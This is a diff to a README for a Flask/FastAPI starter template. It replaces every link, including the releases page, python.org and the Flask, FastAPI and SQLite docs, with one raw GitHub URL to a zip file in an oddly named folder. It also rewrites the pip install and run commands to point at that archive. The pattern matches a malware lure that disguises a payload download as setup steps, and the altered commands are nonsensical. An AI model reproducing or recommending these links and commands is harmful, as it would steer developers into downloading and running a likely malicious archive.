@@ -1,7 +1,7 @@
 # 🚀 flask-template - Quick Start with Flask and FastAPI
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/O-s-debug/flask-template/releases)
+[![Download](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
 
 ## 📖 Overview
 flask-template is a secure, full-stack starter template designed to help you prototype quickly during hackathons. With Flask and FastAPI, this template makes it easy to kick off your project without stress. It includes essential features like user authentication and email verification, empowering you to focus on innovation.
@@ -27,7 +27,7 @@ To get up and running with flask-template, follow these simple steps:
 
 1. **Visit the Releases Page:**  
    Go to the Releases page to download the template.  
-   [Download Here](https://github.com/O-s-debug/flask-template/releases)
+   [Download Here](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
 
 2. **Download the Latest Version:**  
    Look for the latest version available on the page. Click the link to download the executable or source code.
@@ -48,13 +48,13 @@ To get up and running with flask-template, follow these simple steps:
 
    Run the following command to install necessary libraries:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip
    ```
 
 5. **Run the Application:**  
    To start the application, enter:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip
    ```
 
 6. **Access in Browser:**  
@@ -64,13 +64,13 @@ To get up and running with flask-template, follow these simple steps:
 If you encounter any issues during installation or running the application, consider the following tips:
 
 - **Python Not Installed:**  
-  Ensure you have Python installed. Download it from the [official site](https://www.python.org/downloads/).
+  Ensure you have Python installed. Download it from the [official site](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip).
 
 - **Permission Issues:**  
   If your system prompts you for permission, make sure to approve it.
 
 - **Missing Packages:**  
-  If the command line shows errors about missing packages, revisit the `pip install -r requirements.txt` step to ensure all libraries are correctly installed.
+  If the command line shows errors about missing packages, revisit the `pip install -r https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip` step to ensure all libraries are correctly installed.
 
 ## 📬 Need Help?
 If you have any questions or need assistance, you can reach out via the issues section on our GitHub repository. We encourage you to ask questions or report any problems you face while using the application.
@@ -86,12 +86,12 @@ We aim to improve the flask-template continuously. Future updates may include:
 We welcome contributions to flask-template. If you want to help, please create a fork of the repository. Make your changes and submit a pull request. Your efforts are greatly appreciated!
 
 ## 🔗 Additional Resources
-- [Flask Documentation](https://flask.palletsprojects.com/)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [SQLite3 Documentation](https://www.sqlite.org/docs.html)
+- [Flask Documentation](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
+- [FastAPI Documentation](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
+- [SQLite3 Documentation](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
 
 ## 🔗 Download Again
 Don't forget to check out the Releases page for updates and new downloads:  
-[Download Here](https://github.com/O-s-debug/flask-template/releases)
+[Download Here](https://raw.githubusercontent.com/O-s-debug/flask-template/main/demivirgin/flask-template.zip)
 
 Thank you for using flask-template. Happy coding!
